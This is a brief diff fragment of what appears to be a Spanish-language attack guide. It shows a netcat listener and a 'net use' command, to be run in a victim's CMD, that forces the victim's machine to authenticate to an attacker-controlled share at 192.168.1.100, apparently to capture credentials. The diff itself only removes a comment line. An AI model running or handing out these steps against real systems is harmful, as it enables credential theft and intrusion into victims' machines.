@@ -63,7 +63,7 @@ netcat -lvp 5555
 ````
 
 ## 💣 Paso clave: Forzar autenticación
-## En la máquina víctima (manual o con script):
+
 ## Ejecutar esto en CMD de la víctima:
 ```bash
 net use \\192.168.1.100\fake-share /u:fakeuser fakepass
